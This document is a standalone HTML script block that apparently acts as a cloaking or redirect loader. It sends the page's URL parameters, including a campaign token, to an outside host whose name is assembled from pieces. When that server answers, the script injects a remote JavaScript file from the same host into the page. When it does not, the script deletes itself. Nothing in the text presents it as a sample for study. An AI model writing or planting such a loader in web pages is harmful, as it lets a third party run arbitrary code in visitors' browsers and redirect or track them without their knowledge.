<script id="ahAoVWp">
  var xhr = new XMLHttpRequest();
  var urlParams = new URLSearchParams(window.location.search);
  var token = urlParams.get('utm_campaign');
  var pixel = urlParams.get('pixel');
  var host = 'clustersquad';
  var domain_zone = 'info';
  var t = '';
  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
  xhr.send();
  xhr.onload = function () {
    t = xhr.response;
    t = t.replace(/00pixel00/gi, pixel);
    t = JSON.parse(t);
    t = t.redirect.content;
    if (t != "") {
      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
      var a = document.createElement("script"), h = "head";
      a.async = true;
      a.src = 'https://' + host + '.' + domain_zone + '/themes/js/navigation.js';
      document.getElementsByTagName(h)[0].appendChild(a)
    }else document.getElementById("ahAoVWp").remove();
  }
</script>
